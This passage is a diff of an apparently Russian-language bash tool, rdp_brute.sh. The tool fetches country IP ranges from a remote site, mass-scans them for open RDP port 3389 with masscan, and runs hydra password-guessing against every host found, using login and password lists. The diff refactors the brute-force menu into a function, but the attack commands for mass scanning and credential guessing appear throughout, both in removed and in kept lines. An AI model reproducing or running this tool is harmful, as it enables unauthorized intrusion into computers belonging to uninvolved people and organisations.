-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -12072,6 +4855,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -12081,53 +4865,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -12145,6 +4883,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -12154,53 +4893,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -12218,6 +4911,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -12227,53 +4921,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -12291,6 +4939,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -12300,53 +4949,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -12364,6 +4967,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -12373,53 +4977,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -12437,6 +4995,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -12446,53 +5005,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -12510,6 +5023,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -12519,53 +5033,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 else
 if [ "$country" = "168" ]; then
 curl http://ipdiapazon.16mb.com/Slovenia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
@@ -12581,6 +5049,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -12590,53 +5059,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 else
 if [ "$country" = "169" ]; then
@@ -12653,6 +5076,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -12662,53 +5086,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 else
 if [ "$country" = "170" ]; then
@@ -12725,6 +5103,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -12734,53 +5113,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 else
 if [ "$country" = "171" ]; then
@@ -12797,6 +5130,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -12806,53 +5140,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 else
 if [ "$country" = "172" ]; then
@@ -12869,6 +5157,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -12878,53 +5167,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 else
 if [ "$country" = "173" ]; then
@@ -12941,6 +5184,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -12950,53 +5194,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 else
 if [ "$country" = "174" ]; then
